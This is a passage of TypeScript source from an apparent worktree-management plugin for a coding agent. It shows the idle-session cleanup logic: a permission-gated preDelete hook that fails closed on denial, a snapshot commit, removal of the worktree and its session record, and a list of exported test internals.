										bindHookConsent(ctx.permission, { sessionID: event.data?.sessionID }),
									)
								} catch (error) {
									// A denial is terminal for this attempt: clear the pending row so later
									// idle events stop re-prompting, keep the worktree (fail closed), and say so.
									clearPendingDelete(database)
									if (isPermissionDenial(error)) {
										log.warn(
											`[worktree] preDelete hook denied; kept worktree at ${worktreePath} and cleared the pending delete. Re-run worktree_delete to retry.`,
										)
									} else {
										log.error(
											`[worktree] preDelete hook failed; kept worktree at ${worktreePath} and cleared the pending delete: ${error}`,
										)
									}
									// Abort this cleanup attempt: no git add/commit/removeWorktree/removeSession below.
									continue
								}
							}

							// Commit any uncommitted changes
							const addResult = await git(["add", "-A"], worktreePath)
							if (!addResult.ok) log.warn(`[worktree] git add failed: ${addResult.error}`)

							const commitResult = await git(
								["commit", "-m", "chore(worktree): session snapshot", "--allow-empty"],
								worktreePath,
							)
							if (!commitResult.ok) log.warn(`[worktree] git commit failed: ${commitResult.error}`)

							// Remove worktree
							const removeResult = await removeWorktree(directory, worktreePath)
							if (!removeResult.ok) {
								log.warn(`[worktree] Failed to remove worktree: ${removeResult.error}`)
							}

							// Clear pending delete atomically
							clearPendingDelete(database)

							// Remove session from database
							removeSession(database, branch)
						}
					} catch (error) {
						// Keep the subscription alive on per-event failures (sqlite/hook/fs)
						log.error(`[worktree] session.idle handler failed: ${error}`)
					}
				}
			})().catch((error) => {
				console.error("[worktree] event subscription failed", error)
			})

			return () => controller.abort()
		},
	}),
	{
		testInternals: {
			isPathLikeCommand,
			copyFiles,
			ensureLaunchContextExecutable,
			validateOcxProfileAvailability,
			ensureLaunchContextProfile,
			finalizeWorktreeLaunch,
			symlinkDirs,
			splitHookCommands,
			isPermissionDenial,
		},
	} as const,
)
